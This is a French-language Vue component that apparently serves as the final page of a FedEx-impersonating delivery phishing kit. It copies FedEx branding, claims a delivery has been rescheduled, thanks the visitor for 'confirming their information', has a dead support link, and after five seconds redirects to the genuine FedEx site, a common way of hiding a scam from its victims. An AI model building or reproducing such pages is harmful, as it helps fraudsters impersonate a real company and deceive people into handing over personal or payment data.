<script setup>
import { useSession } from '../../composables/session';

useSession()
// Calcule la date de demain en français
const tomorrow = new Date();
tomorrow.setDate(tomorrow.getDate() + 1);
const days = ['Dimanche','Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi'];
const months = ['janvier','février','mars','avril','mai','juin','juillet','août','septembre','octobre','novembre','décembre'];
const tomorrowText = `${days[tomorrow.getDay()]} ${tomorrow.getDate()} ${months[tomorrow.getMonth()]}`;

setTimeout(() => {
  window.location.href = 'https://www.fedex.com/fr-fr/home.html'
}, 5000)
</script>

<template>
  <div class="min-h-screen flex flex-col justify-center items-center bg-gray-50 px-4 py-10">
    <div class="flex flex-col items-center space-y-4 w-full max-w-md">
      <!-- Icône check FedEx -->
      <div class="flex items-center justify-center bg-[#4d148c] rounded-full w-20 h-20 shadow">
        <svg class="w-12 h-12 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <circle cx="12" cy="12" r="12" fill="#4d148c"/>
          <path stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M7 13l3 3 7-7"/>
        </svg>
      </div>
      <!-- Message -->
      <h1 class="text-2xl md:text-3xl font-extrabold text-[#4d148c] text-center leading-tight">
        Félicitations&nbsp;!<br />
        Votre livraison est reprogrammée
      </h1>
      <p class="text-gray-700 text-center text-base md:text-lg">
        Votre demande a bien été prise en compte.<br/>
        <span class="block font-semibold text-[#4d148c] mt-2">
          La nouvelle tentative de livraison aura lieu <span class="text-[#ff6600]">{{ tomorrowText }}</span>.
        </span>
      </p>
      <div class="mt-6 w-full flex flex-col items-center">
        <svg class="w-10 h-10 text-[#ff6600]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke="#ff6600" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M3 12h18M12 5v14"/>
        </svg>
        <span class="mt-2 text-xs text-gray-500 text-center">
          Merci d’avoir confirmé vos informations. FedEx vous enverra une notification lors de la prochaine livraison.<br/>
          <span class="text-[#4d148c] font-medium">Besoin d’aide ? <a href="#" class="underline hover:text-[#ff6600]">Contacter le support</a></span>
        </span>
      </div>
    </div>
  </div>
</template>
